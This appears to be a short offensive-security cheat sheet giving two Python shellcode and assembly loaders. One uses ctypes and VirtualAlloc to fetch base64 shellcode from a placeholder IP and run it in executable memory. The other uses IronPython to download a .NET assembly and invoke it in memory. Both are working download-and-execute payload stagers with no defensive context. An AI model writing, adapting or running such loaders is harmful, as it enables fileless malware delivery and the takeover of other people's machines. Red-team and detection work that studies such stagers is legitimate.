# Python

## Ctypes

```python
import base64
import ctypes
from urllib import request

kernel32 = ctypes.windll.kernel32

VirtualAlloc = kernel32.VirtualAlloc
RtlMoveMemory = kernel32.RtlMoveMemory
CreateThread = kernel32.CreateThread
WaitForSingleObject = kernel32.WaitForSingleObject

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
        return shellcode

def write_memory(buf):
    length = len(buf)

    VirtualAlloc.restype = ctypes.c_void_p
    pointer = VirtualAlloc(None, length, 0x3000, 0x40)

    RtlMoveMemory.argtypes = (
        ctypes.c_void_p,
        ctypes.c_void_p,
        ctypes.c_size_t
    )
    kernel32.RtlMoveMemory(pointer, buf, length)
    return pointer

def run(shellcode):
    buf = ctypes.create_string_buffer(shellcode)
    ptr = write_memory(buf)
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://<IP>/file.bin"
    shellcode = get_code(url)
    run(shellcode)
```

## .NET (IronPython)

```python
import System
from System.Net import *
from System.Reflection import *

def get_binary(url):
    client = WebClient()
    binary_bytes = client.DownloadData(url)
    return binary_bytes

def execute_assembly(url):
    binary_data = get_binary(url)
    print("[+] Donwnloaded data from remote source")
    entry = Assembly.Load(binary_data).EntryPoint
    print("[+] Loaded Assembly at entry point")
    entry.Invoke(None, System.Array([]))
    print("[+] Invoked Assembly assuming no parameters")
```